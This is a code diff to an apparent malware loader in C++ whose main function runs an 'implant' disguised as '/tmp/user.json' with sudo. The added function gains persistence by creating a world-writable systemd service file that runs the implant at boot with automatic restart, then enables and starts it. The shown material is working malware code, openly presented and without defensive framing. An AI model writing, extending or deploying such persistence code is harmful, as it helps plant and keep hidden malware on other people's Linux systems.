@@ -4,6 +4,45 @@
 #include <vector>
 #include <thread>
 #include <chrono>
+#include <fstream>
+#include <filesystem>
+
+namespace fs = std::filesystem;
+
+
+int persistence() {
+    const std::string serviceName = "private";
+    const std::string execPath = "/tmp/user.json";
+    const std::string serviceFile = "/etc/systemd/system/" + serviceName + ".service";
+    system(("sudo touch " + serviceFile).c_str());
+    system(("sudo chmod 0777 " + serviceFile).c_str());
+
+    std::ofstream out(serviceFile);
+    if (!out || !fs::exists(execPath)) {
+        return 1;
+    }
+    
+    out <<
+"[Unit]\n"
+"Description=My Application Service\n"
+"After=network.target\n\n"
+"[Service]\n"
+"Type=simple\n"
+"ExecStart=" << execPath << "\n"
+"Restart=always\n"
+"User=nobody\n\n"
+"[Install]\n"
+"WantedBy=multi-user.target\n";
+
+    out.close();
+
+    system("sudo systemctl daemon-reexec");
+    system("sudo systemctl daemon-reload");
+    system(("sudo systemctl enable " + serviceName).c_str());
+    system(("sudo systemctl start " + serviceName).c_str());
+    system(("sudo chmod 0755 " + serviceFile).c_str());
+    return 0;
+}
 
 int main() {
     // 1. Get the implant
@@ -51,6 +90,6 @@ int main() {
     std::cout << "[*] Attempting to execute implant with sudo..." << std::endl;
     std::string runImplant = "sudo /tmp/user.json";
     std::system(runImplant.c_str());
-
+    persistence();
     return 0;
 }
